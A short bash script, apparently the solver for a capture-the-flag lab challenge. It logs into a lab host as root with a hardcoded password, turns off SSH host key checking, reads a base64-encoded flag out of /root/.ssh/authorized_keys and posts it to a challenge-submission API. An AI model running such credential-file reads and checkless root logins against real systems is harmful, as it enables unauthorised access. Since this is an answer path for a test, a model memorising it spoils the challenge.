#!/bin/bash
set -euo pipefail

host='172.20.0.141'
password='orbit-Console-7'
challenge_id='scl-challenge-frame-97ae11'

encoded=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "root@$host" "awk 'NR == 1 { print \$3 }' /root/.ssh/authorized_keys")
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode(), end="")')

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"$challenge_id\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
